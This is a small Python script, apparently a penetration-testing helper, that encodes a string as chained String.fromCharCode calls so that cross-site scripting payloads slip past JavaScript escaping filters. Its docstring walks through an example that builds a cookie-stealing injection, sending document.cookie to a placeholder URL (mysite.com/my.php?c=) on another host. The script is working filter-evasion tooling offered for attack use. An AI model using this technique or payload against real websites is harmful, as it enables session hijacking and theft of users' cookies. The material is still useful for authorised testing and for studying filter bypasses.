#!/usr/local/bin/python
# encoding: utf-8
"""
Script to encode a String in order to bypass JavaScript escaping.

Useful, for example, when the escaping feature in place disable use 
of character like ' / " / + in order to avoid JavaScript command assembling.

Example case: 
You want to inject this JavaScript command in a XSS vulnerability injection point:
"http://mysite.com/my.php?c=" + document.cookie 

You use the script to encode this part of the command String (no quote):
http://mysite.com/my.php?c=

After you add the ".concat(document.cookie)" suffix to the encoded String
and it's done :)

Limitation: Do not use quote into the parameter passed to the script otherwise
it will be encoded and it will perhaps break the command. If your commands contains
space then call script for each String token and use ".concat()" function to link
them together.

Author: Dominique RIGHETTO
"""
import sys
#Check parameter
if len(sys.argv) == 1:
    print("JavaScript command to encode is missing.")
    print("  Syntax : jscmd-escaper-evader.py JAVASCRIPT_CMD")
    print("  Example: jscmd-escaper-evader.py http://mysite.com/my.php?c=")
    sys.exit(-1)
#Get String to encode from command line single argument
js_cmd = sys.argv[1]
#Process it
enc_cmd = "String.fromCharCode(%i)" % (ord(js_cmd[0]))
for c in js_cmd[1:]:
    enc_cmd += ".concat(String.fromCharCode(%i))" % (ord(c))      
#Display result in console
print(enc_cmd)